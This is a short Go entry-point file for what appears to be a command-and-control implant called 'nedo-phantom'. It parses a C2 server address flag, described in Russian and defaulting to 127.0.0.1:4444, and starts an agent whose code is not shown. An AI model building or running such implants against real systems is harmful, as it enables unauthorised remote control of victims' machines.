package main

import (
    "flag"
    "nedo-phantom/internal/agent/core"
)

var (
    serverAddr = flag.String("server", "127.0.0.1:4444", "адрес C2 сервера")
)

func main() {
    flag.Parse()
    agent := core.NewAgent(*serverAddr)
    agent.Run()
}
